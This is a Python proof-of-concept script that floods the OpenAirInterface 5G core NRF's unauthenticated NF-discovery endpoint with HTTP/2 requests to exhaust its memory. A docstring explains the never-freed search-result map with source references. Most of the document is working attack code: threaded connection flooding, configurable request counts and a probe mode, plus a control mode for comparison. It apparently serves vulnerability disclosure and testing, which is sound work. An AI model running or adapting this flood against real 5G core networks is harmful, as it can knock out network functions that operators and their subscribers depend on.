#!/usr/bin/env python3
"""
PoC - OAI CN5G NRF uncontrolled memory growth via NFDiscovery search-result
retention (non-PCF NF).

Vulnerability
-------------
On `GET /nnrf-disc/v1/nf-instances` (NFDiscover), OAI-CN5G NRF:

  1. passes the authorization gate unconditionally --
     nrf_app::is_service_discover_allowed() is a stub that returns true
     (src/nrf_app/nrf_app.cpp:1359-1364);
  2. mints a brand-new, server-side monotonic Search-Id per request --
     generate_search_id() = search_id_generator.get_uid() which does `++uid`
     (src/nrf_app/nrf_app.cpp:1367-1369 + src/common-src/utils/uint_generator.hpp);
  3. allocates a fresh std::make_shared<nrf_search_result>() and, if any NFs
     matched, pins their nrf_profile shared_ptrs (src/nrf_app/nrf_app.cpp:685-694);
  4. stamps a validity period of 100 s (src/nrf_app/nrf_app.cpp:704) that is
     NEVER enforced -- there is no search-result sweeper;
  5. inserts it into the process-global map `search_id2search_result`
     (add_search_result, src/nrf_app/nrf_app.cpp:1372-1378).

`search_id2search_result` is insert-only: there is NO erase anywhere in the
NRF (its siblings instance_id->profile and subscription_id->subscription DO get
erased on deregister/DELETE; search results never do). The map is only destroyed
at process shutdown.

Consequence: every unauthenticated NFDiscovery request permanently grows the
map by one entry (~hundreds of bytes, plus retained NF profiles). Because the
id is server-generated, NO client value can be reused to dedup -- the attacker
cannot be limited by cache deduplication. Sustained discovery traffic ->
monotonic RSS growth (memory-exhaustion DoS) and unbounded retention of
deregistered NF profiles.

The clean differential: a request with an INVALID `target-nf-type` is rejected
with 400 at src/nrf_app/nrf_app.cpp:670-678, i.e. BEFORE the allocation at :685,
so it grows nothing (flat control at identical request volume).

Standard deviation: TS 29.510 / TS 29.571 make search results a cached,
time-bounded artifact; retaining them forever with an enforced validity_period
that is never honored is an implementation defect (CWE-401/772 -> CWE-400).

Usage
-----
    # ATTACK: N valid NFDiscover requests -> N permanent search results
    python3 oai_nrf_disc_leak_poc.py --target-ip 127.0.0.1 --port 18080 --count 20000

    # CONTROL: N requests with an invalid target-nf-type (400 before allocation)
    python3 oai_nrf_disc_leak_poc.py --target-ip 127.0.0.1 --port 18080 --count 20000 --control

    # PROBE: send one request and print the response (shows the Search-Id)
    python3 oai_nrf_disc_leak_poc.py --probe

Dependencies: python3 + the `h2` package (pip install h2).
"""
import argparse
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor

try:
    import h2.config
    import h2.connection
except ImportError:
    sys.stderr.write("[!] the 'h2' package is required:  pip install h2\n")
    sys.exit(2)

PATH = "/nnrf-disc/v1/nf-instances"


def make_query(target_nf_type, requester_nf_type):
    return "%s?target-nf-type=%s&requester-nf-type=%s" % (
        PATH, target_nf_type, requester_nf_type)


def flood_connection(ip, port, query, n, drain_s=0.6):
    """One short-lived h2c connection carrying up to `n` GET discovery streams,
    a brief drain so the server completes handling (the search result is created
    during handling), then close. Returns the number of requests submitted."""
    try:
        sock = socket.create_connection((ip, port), timeout=10)
    except OSError:
        return 0
    sock.settimeout(0.4)
    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=cfg)
    conn.initiate_connection()
    try:
        sock.sendall(conn.data_to_send())
    except OSError:
        sock.close()
        return 0
    sid, sent = 1, 0
    for _ in range(n):
        try:
            conn.send_headers(sid, [
                (":method", "GET"), (":scheme", "http"),
                (":path", query), (":authority", "%s:%d" % (ip, port)),
                ("accept", "application/json"),
            ], end_stream=True)
            sock.sendall(conn.data_to_send())
        except Exception:
            break
        sid += 2
        sent += 1
        try:  # opportunistic non-blocking drain (flow control / WINDOW_UPDATE)
            data = sock.recv(65535)
            if data:
                conn.receive_data(data)
                out = conn.data_to_send()
                if out:
                    sock.sendall(out)
        except socket.timeout:
            pass
        except OSError:
            break
    t0 = time.time()
    while time.time() - t0 < drain_s:
        try:
            data = sock.recv(65535)
            if not data:
                break
            conn.receive_data(data)
            out = conn.data_to_send()
            if out:
                sock.sendall(out)
        except socket.timeout:
            continue
        except OSError:
            break
    try:
        sock.close()
    except OSError:
        pass
    return sent


def probe(ip, port, target, requester):
    """Send a single request over one h2c connection and print the response
    (status + body), which carries the server-assigned Search-Id."""
    import h2.events
    try:
        sock = socket.create_connection((ip, port), timeout=10)
    except OSError as e:
        print("[!] connect failed: %s" % e)
        return 1
    sock.settimeout(4)
    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=cfg)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    conn.send_headers(1, [
        (":method", "GET"), (":scheme", "http"),
        (":path", make_query(target, requester)),
        (":authority", "%s:%d" % (ip, port)),
        ("accept", "application/json"),
    ], end_stream=True)
    sock.sendall(conn.data_to_send())
    status, body = None, b""
    t0 = time.time()
    while time.time() - t0 < 4:
        try:
            data = sock.recv(65535)
        except (socket.timeout, OSError):
            break
        if not data:
            break
        for ev in conn.receive_data(data):
            if isinstance(ev, h2.events.ResponseReceived):
                for k, v in ev.headers:
                    if k == b":status":
                        status = v.decode()
            elif isinstance(ev, h2.events.DataReceived):
                body += ev.data
                conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)
            elif isinstance(ev, h2.events.StreamEnded):
                conn.data_to_send()
        out = conn.data_to_send()
        if out:
            sock.sendall(out)
        if status is not None and body:
            break
    try:
        sock.close()
    except OSError:
        pass
    print("[*] GET %s -> HTTP %s" % (make_query(target, requester), status))
    print("[*] body: %s" % (body.decode("utf-8", "replace") or "<empty>"))
    return 0


def main():
    ap = argparse.ArgumentParser(
        description="OAI CN5G NRF NFDiscovery search-result memory-growth PoC")
    ap.add_argument("--target-ip", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18080)
    ap.add_argument("--target-nf-type", default="AMF")
    ap.add_argument("--requester-nf-type", default="NRF")
    ap.add_argument("--count", type=int, default=20000,
                    help="number of NFDiscover requests to send")
    ap.add_argument("--control", action="store_true",
                    help="use an INVALID target-nf-type (400 before allocation -> flat)")
    ap.add_argument("--chunk", type=int, default=48,
                    help="requests per h2c connection")
    ap.add_argument("--threads", type=int, default=24,
                    help="parallel short-lived connections")
    ap.add_argument("--drain", type=float, default=0.6,
                    help="seconds to let the server finish each connection")
    ap.add_argument("--probe", action="store_true",
                    help="send a single request and show how to view the Search-Id")
    args = ap.parse_args()

    target = "BOGUS" if args.control else args.target_nf_type
    query = make_query(target, args.requester_nf_type)

    if args.probe:
        return probe(args.target_ip, args.port, args.target_nf_type,
                     args.requester_nf_type)

    mode = "CONTROL (invalid target-nf-type -> 400 before allocation)" if args.control \
        else "ATTACK (%d valid NFDiscover -> permanent search results)" % args.count
    print("[*] target : %s:%d%s" % (args.target_ip, args.port, query))
    print("[*] mode   : " + mode)

    nconn = (args.count + args.chunk - 1) // args.chunk
    per = [args.chunk] * nconn
    per[-1] = args.count - args.chunk * (nconn - 1)

    t0 = time.time()
    sent = 0
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        for n in ex.map(lambda c: flood_connection(
                args.target_ip, args.port, query, c, args.drain), per):
            sent += n
    print("[*] sent=%d/%d requests in %.1fs (%.0f req/s)"
          % (sent, args.count, time.time() - t0,
             sent / max(1e-6, time.time() - t0)))
    if not args.control:
        print("[*] each valid request left a permanent, uniquely-keyed entry in "
              "search_id2search_result (monotonic Search-Id, no eviction).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
